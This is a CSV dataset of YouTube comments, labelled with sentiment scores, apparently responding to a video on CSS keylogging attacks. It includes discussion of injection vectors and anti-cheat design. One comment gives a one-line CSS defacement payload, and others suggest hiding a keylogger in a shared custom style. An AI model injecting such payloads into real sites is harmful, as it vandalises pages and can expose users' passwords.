,sentiment,wordCount
"""It's your mind that twists not the spoon"" - Matrix 99",0.0,13
"""almost every video""? Sounds like you had bad luck, but now you have seen all of them. The other videos are not like that at all. Maybe try out the CTF video write-up playlist!",0.6177,41
#MUWA • Because CSS can download things like images and it   can also inject HTML.,0.3612,16
".mario alias ""The handsome Heartbreaker"" 😄😄",0.0,10
"1. How many skilled ""hacker"" already used this...
2. How many other things out there that's not published :)

These exploits worth tons of money while they're unpublished and kept secret",-0.4552,36
"1. hackers still can find variable because its get display on screen unecrypted, check "" Backtracing Shared Instructions from Visual Addresses"" video

2. many games don't do that because it causes lag and it not protects from esp and aimbots so no point to do that, its just adds lag to the game, e.g arma3 have client side shoot detection..

3. you still get bad reveiws of the game if there a lot hackers :)

i'm thinking to make anitdebug and code memory verification, so there will be no easy way to edit code or connect cheat engine to the game.",-0.9021,114
<3 another great vedio,0.7906,4
Additionally it shows a great POC using chrome extensions as CSS injector which is less common to vet compared to malicious JS injection,0.6249,23
Agreed this isn't a keylogger.,0.2732,6
Amazing! Never heard of CSS attacks.,0.2942,8
An Enemy LMFAO true xD,0.8091,5
"An easy anti cheat to make, is to take the variable, multiply it's value by a random number, and store that number alongside it, each time you read or write that value, you change the random number.
it stops a lot of people from simply using cheat engine and modifying the variable.
if you are communicating with an http server, do use Https and verify the certificate.
also if you are making a single player/local coop game, *don't put an anti cheat in*, but do put an ""assist mode"" or a ""crazy mode"".

if you are using a client-server model, don't trust the client and do the calculations on the server, this is more intensive, but you avoid most cheats.
also, you can try to look for mods/cheats and put players that are cheating in the same matchmaking pool, most cheaters don't mind that.

another way to look at it is to wonder how cheats can and would impact the game,  and put those in in a limited fashion, for example, if people may be looking to slow down or speed up the game, allow it in private lobbies with a 0.5-x4 speed, it might help people not want to cheat.

finally, you can't make a 100% proof anti cheat, so the simplest option is to have players report cheaters, and look at the numbers of complaints a given player gets, then put him in a cheater queue if they get complaints too often.",-0.9952,286
And I learned about it trough this video.,0.0,9
"And deface with this 1 line :P
*{animation:ha 1s infinite}@keyframes ha{from{transform:scale(2)}to{transform:rotate(360deg)}}",0.4084,37
"And even if it was, the CSS would be computed and rendered on page load - when the input field is empty",-0.2023,23
Awesome!,0.6588,2
Basically any forum messageboard site that displays user content while the viewer is logging in is vulnerable.,-0.2263,18
Berlinsides! I was making music there lol,0.4753,8
Bist du deutsch???,0.0,6
Browsers are aware of this and they consider it a privacy violation. Doesn't work in Chrome 64.,-0.4939,19
But how is this relevant? wouldn't the effort of injecting a CSS code into a browser is the same as injecting JS codes?,0.0,25
But the point of the video is that we didn’t just discover that :D it was known for many years ;),0.7125,23
"CSS is a Turing complete language. you could rewrite metasploit in CSS, you could write a C comiler in CSS, you get the idea",0.0,27
CSS keylogging isn’t new (2009 http://slideplayer.com/slide/3493669/) but the reason the github repo exploded is because it applies it to REACT apps.,0.0,26
Couldn't you combine this with css variables and then capture the actual password?,0.0,14
"Cross Site Styling ""Other XSS"" can get dangerous, but the main attack vector is that it can be abused to mask injected HTML to look like legit content of the website, and can carry out pretty effective phishing attacks.",-0.4215,44
"Daniel Schmidt
Yes, but you are the one using it, and you will also be the victim of an attack through that extention, so you have to be sure that the programmer behind the extension is not black hat, and if you download external CSS styles for that extention, you also have to be sure they are not containing things like this.
You cannot really blame that on CSS, if it is the user who is careless.",-0.4742,85
Danka leute. Thx guys,0.3612,5
"Didn't know that it was already discovered, but I found this attack at the beginning good, but after 10 min of research it wasn't good than I understood, and so the title is for smth",0.4142,38
"Didn’t even think to check for that, thanks a ton!",0.4926,14
Er ist Österreicher.,0.0,4
"GREAT Video, well explained and intresting moderation! Keep it goin' sir :D",0.9054,15
Great as always.,0.6249,4
"Great content as usual man, love your channel. Totally off-topic question, but what do you use for your pen/pencil/drawing overlay graphics when you make your videos?

I have some video tutorials for a couple friends that involve a lot of math that would be much easier to write into than use some kind of equation formatter.",0.9186,65
"Great idea! Rediscover old xss hacks, have everyone download your chrome plugin.
Its not like you couldnt just put a keylogger in the plugin right?",0.5076,29
"Great video bro, never heard of css attack!",0.3164,10
Harold Oxlay XHTML and CSS Tutorials Playlist: https://www.youtube.com/playlist?list=PLC1322B5A0180C946,0.0,9
Harold Oxlay learn css and check it again,0.0,8
"Hay I'm not trying to troll. 
Do you know anything about RUST? 
I'm a code noob. could you do a video on Rust please.",0.2732,28
"Hello, LiveOverflow! 
I like your videos a lot, thank you!

Just an idea.. maybe you could make a video about how to generally be safe on the internet? 
Something a little bit more detailed than just ""look what sites you visit"" and ""dont open unknown binaries"" ?

I have encountered so many situations where simply from visiting a website, even with the newest browser version, i suddenly had malware on my pc.",0.8336,85
"Heywood Yabloome Correct. I am aware of this problem. But how many ""regular users"" are? 90% of the users probably don't even think about this when installing a custon style",-0.481,36
His opinion,0.0,2
How do you inject the malicious css though?,0.0,9
I don’t understand how anyone could possibly exploit my web app with this?,-0.1027,16
"I for example use a chrome plugin which allows you to have user created css for certain websites. Just create your own ""style"" that includes the keylogger",0.6369,30
I fucking love this channel ! <3,0.8264,7
"I fucking love this channel ! <3
I fucking love this channel ! <3
I fucking love this channel ! <3
I fucking love this channel ! <3
I fucking love this channel ! <3
I fucking love this channel ! <3
I fucking love this channel ! <3",0.9951,49
"I had a very similar story that brought me to meet .mario, among other amazing people. In 2016, I published a slidedeck explaining how to encode JavaScript with only six characters, believing to be the first to think about that. This had its small success on the news sites and was published in JS Weekly. It turned out that Martin Kleppe had preceded me with his project JSFuck, and that this idea had already been studied in a book published in 2011 and written by ... Mario Heiderich, Eduardo Albert Vela Nava, Gareth Heyes and David Lindsay. It's a small world ! In the end, I was able to talk with them and join their working group to contribute. I think Mike Gualtieri made the same mistake as me, but if it helps to inform people while getting experts and apprentices to meet each other, then it's a good, innocent mistake.",0.8687,168
"I had once been very interested in hacking/Cyber Security but never pursued the interest for lack of experience and the vastness of the field. However, now that I am graduating with a CSCI degree and have some experience in various programming languages this is a lot more feasible. The only reason that this was even brought to my attention was your incredibly informative videos. I am now considering a career path in the field and even a masters degree. This is all thanks to your hard work. I really appreciate what you do. Keep kickin ass!",-0.3129,106
I have seen it loong time ago w/ using font ligatures so you are not abaddoned in this surprise :),0.657,21
I spotted the guy who just learned js,0.0,8
"I think to a typical user, losing their password privacy is actually a big deal, so if this can keylog a password, that's not a small problem.",-0.088,31
"I though css is just for styling script for html, and this attack is really break my tough about css :v",-0.6585,23
"I use JavaScript and HTML on simple sites, but I see why people would use react for complicated web applications",0.0,21
I was just thinking you should make a video about this and... you didn't take long to do it!,0.0,21
"I'm a new subscrito to your channel and I must say that I'm stunned by your videos. I'm not a hacker/programmer myself, but I'm really interested in that stuff and I want to learn ""it"" over the next years.
My question to you would be ""How old were you when you started programming?"" and ""How many programming languages do you speak?"" and ""How long did it take to get this profound knowledge of things to work with?""
The last question is kinda cheesy, because you never stop learning, but I mean, how long did it take to get all most of the necessary meta-knowledge that led to the first ""Aha!"" moments you had during hacking/reverse engineering?

I'm a big fan of your work. Keep it up!
Greets from a fellow German :D (Your accent is hard to miss^^)",0.9579,169
"If this blew your mind. Did you actually know, that HTML5 and CSS3 together are turing complete? 
Someone implemented Rule 110 with it 😵",0.0,29
"If we just discovered how to make  key loggers in css,imagine how many things we have not discoverd.....",0.0,21
